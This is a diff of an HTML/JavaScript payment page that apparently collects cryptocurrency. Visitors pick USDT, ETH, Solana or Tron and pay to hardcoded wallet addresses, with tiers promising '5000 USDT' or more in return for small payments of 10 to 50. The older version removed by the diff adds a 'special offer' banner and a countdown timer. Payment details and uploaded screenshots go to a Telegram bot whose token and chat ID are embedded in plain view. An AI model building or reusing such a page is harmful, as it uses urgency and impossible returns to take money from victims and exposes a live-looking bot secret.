@@ -2,161 +2,224 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Payment</title>
+  <title>Payment Info</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       margin: 0;
-      padding: 0;
-      background: url('background.jpg') no-repeat center center fixed;
-      background-size: cover;
-      font-family: 'Arial', sans-serif;
+      background-color: #121212;
       color: white;
+      font-family: sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      padding: 20px;
+      min-height: 100vh;
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 20px;
-      padding: 30px 20px;
+      background-color: #1e1e1e;
+      padding: 5vw;
+      border-radius: 2vw;
+      width: 100%;
+      max-width: 500px;
       text-align: center;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
     }
 
-    .qr {
-      margin: 20px 0;
+    h2, h3 {
+      font-size: 6vw;
+      margin: 3vw 0;
+    }
+
+    select, button {
+      padding: 4vw;
+      margin: 4vw 0;
+      border-radius: 2vw;
+      border: none;
+      width: 100%;
+      font-size: 5vw;
+    }
+
+    .network-image {
+      width: 25vw;
+      max-width: 120px;
+      margin: 5vw auto;
+    }
+
+    .qr-image {
+      margin-top: 4vw;
+      margin-bottom: 2vw;
+      width: 40vw;
+      max-width: 200px;
     }
 
     .address-box {
-      background-color: rgba(0,0,0,0.4);
-      padding: 12px;
-      border-radius: 10px;
-      word-wrap: break-word;
-      font-size: 14px;
+      background-color: #2c2c2c;
+      padding: 4vw;
+      border-radius: 2vw;
+      word-break: break-word;
+      font-size: 4vw;
+      margin-top: 4vw;
     }
 
-    button {
-      margin-top: 10px;
-      background-color: #00bcd4;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 8px;
-      cursor: pointer;
-      color: white;
-      font-weight: bold;
+    .value-display {
+      font-size: 5vw;
+      color: #0f0;
+      margin-top: 2vw;
     }
 
-    button:hover {
-      background-color: #0097a7;
-    }
-
-    input[type="file"] {
-      display: none;
-    }
-
-    #countdown {
-      font-size: 16px;
-      margin: 10px 0;
-      color: #ffcc00;
-    }
-
-    .screenshot-title {
-      margin-top: 25px;
-      font-size: 15px;
-      color: #ff8888;
+    #warningText {
+      font-size: 4vw;
+      color: #f99;
+      margin-top: 4vw;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h2>YOUR PAYMEMT NETWORK</h2>
+    <select id="networkSelect" onchange="showPaymentInfo()">
+      <option value="">Select Network</option>
+      <option value="USDT">TETHER BSC (BEP20)</option>
+      <option value="ETH">ETH</option>
+      <option value="Solana">Solana</option>
+      <option value="Trx">Tron</option>
+    </select>
 
-<div class="container">
-  <h2> Pay 1̶0̶0̶ special offer 50  USDT( ONLY BEP20)</h2>
-  <p>MAKE PAYMENT WITH BEP20, please pay to the following address:</p>
+    <div id="paymentInfo" style="display:none;">
+      <img id="networkImage" class="network-image" src="" alt="Network">
 
-  <div class="qr">
-    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x9B767999d83651c244D2225A910a3a2456c98a3c" alt="QR Code">
+      <h3>Choose Amount</h3>
+      <select id="amountSelect" onchange="showValue()">
+        <option value="">Select Amount</option>
+      </select>
+      <div class="value-display" id="valueText"></div>
+
+      <p id="warningText"></p>
+
+      <img id="qrCode" class="qr-image" src="" alt="QR Code">
+
+      <div class="address-box" id="addressText"></div>
+
+      <button onclick="confirmPayment()">Confirm Payment</button>
+    </div>
   </div>
 
-  <div class="address-box" id="wallet-address">0x9B767999d83651c244D2225A910a3a2456c98a3c</div>
-  <button onclick="copyAddress()">Copy Address</button>
+  <script>
+    const addresses = {
+      USDT: "0x9B767999d83651c244D2225A910a3a2456c98a3c",
+      ETH: "0x9B767999d83651c244D2225A910a3a2456c98a3c",
+      Solana: "4JAFP2sYg6GWKfziWR8Y8bxz3RwYDBgE6BVzX9KZkqSg",
+      Trx: "TVrN9wQ2c91fk8xHNBj4MNuSQwjzXZmH2h"
+    };
 
-  <div class="screenshot-title">after payment upload a screenshot of the payment before the countdown ends</div>
-  <div id="countdown">19:59</div>
+    const images = {
+      USDT: "bnb.png",
+      ETH: "ethereum.png",
+      Solana: "solana.png",
+      Trx: "tron.png"
+    };
 
-  <button onclick="document.getElementById('screenshot').click()">Payment Done</button>
-  <input type="file" id="screenshot" accept="image/*" onchange="sendToTelegram()">
-</div>
+    const amounts = {
+      USDT: [
+        {usdt: 5000, value: "10"},
+        {usdt: 20000, value: "25"},
+        {usdt: 100000, value: "50"}
+      ],
+      ETH: [
+        {usdt: 5000, value: "0.003902"},
+        {usdt: 20000, value: "0.009756"},
+        {usdt: 100000, value: "0.019512"}
+      ],
+      Trx: [
+        {usdt: 5000, value: "37.432855"},
+        {usdt: 20000, value: "93.582137"},
+        {usdt: 100000, value: "187.164274"}
+      ],
+      Solana: [
+        {usdt: 5000, value: "0.056186"},
+        {usdt: 20000, value: "0.139501"},
+        {usdt: 100000, value: "0.279002"}
+      ]
+    };
 
-<script>
-  function copyAddress() {
-    const address = document.getElementById("wallet-address").textContent;
-    navigator.clipboard.writeText(address).then(() => {
-      alert("Address copied!");
-    });
-  }
+    const tokenMap = {
+      USDT: "USDT",
+      ETH: "ETH",
+      Trx: "TRX",
+      Solana: "SOL"
+    };
 
-  function sendToTelegram() {
-    const fileInput = document.getElementById('screenshot');
-    const file = fileInput.files[0];
-    if (!file) return;
+    const networkMap = {
+      USDT: "BEP20",
+      ETH: "Ethereum",
+      Trx: "Tron",
+      Solana: "Solana"
+    };
 
-    const botToken = "8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw";
-    const chatId = "7739393558";
+    function showPaymentInfo() {
+      const network = document.getElementById("networkSelect").value;
+      if (!network) return;
 
-    const formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("caption", "Payment screenshot (10 USDT - BEP20)");
-    formData.append("photo", file);
+      document.getElementById("networkImage").src = images[network];
+      document.getElementById("warningText").textContent =
+        network === "USDT"
+          ? "Send using Tether (USDT) on the BEP20 (BSC) network only."
+          : `Send only on the ${networkMap[network]} network.`;
+      document.getElementById("addressText").textContent = addresses[network];
+      document.getElementById("paymentInfo").style.display = "block";
+      document.getElementById("networkSelect").style.display = "none";
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      method: "POST",
-      body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (data.ok) {
-        alert("Screenshot sent successfully.");
-      } else {
-        alert("Sending failed. Try again.");
-      }
-    })
-    .catch(error => {
-      console.error(error);
-      alert("An error occurred while sending.");
-    });
-  }
+      // توليد QR Code
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(addresses[network])}`;
+      document.getElementById("qrCode").src = qrUrl;
 
-  // Countdown logic
-  let minutes = 19;
-  let seconds = 59;
-  const countdownElement = document.getElementById("countdown");
+      const amountSelect = document.getElementById("amountSelect");
+      amountSelect.innerHTML = '<option value="">Select Amount</option>';
+      amounts[network].forEach(item => {
+        amountSelect.innerHTML += `<option value="${item.value}">${item.usdt} USDT = ${item.value} ${tokenMap[network]}</option>`;
+      });
 
-  const countdown = setInterval(() => {
-    if (seconds === 0) {
-      if (minutes === 0) {
-        clearInterval(countdown);
-        countdownElement.textContent = "Time expired";
-        countdownElement.style.color = "red";
-        return;
-      }
-      minutes--;
-      seconds = 59;
-    } else {
-      seconds--;
+      document.getElementById("valueText").textContent = "";
     }
 
-    const formatted =
-      String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");
-    countdownElement.textContent = formatted;
-  }, 1000);
-</script>
+    function showValue() {
+      const amount = document.getElementById("amountSelect").value;
+      const network = document.getElementById("networkSelect").value;
+      const token = tokenMap[network];
+      const networkName = networkMap[network];
 
+      document.getElementById("valueText").textContent = amount
+        ? `You will send: ${amount} ${token} via ${networkName}`
+        : "";
+    }
+
+    function confirmPayment() {
+      const network = document.getElementById("networkSelect").value;
+      const amount = document.getElementById("amountSelect").value;
+      const token = tokenMap[network];
+      const networkName = networkMap[network];
+      const address = addresses[network];
+      const chatId = "7739393558";
+      const botToken = "8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw";
+
+      if (!amount || !network) {
+        alert("Please choose network and amount.");
+        return;
+      }
+
+      const msg = `New Payment\nYou will send: ${amount} ${token} via ${networkName}\nAddress: ${address}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: chatId, text: msg})
+      }).then(() => {
+        window.location.href = "screenshot.html";
+      });
+    }
+  </script>
 </body>
-</html>
+</html>9
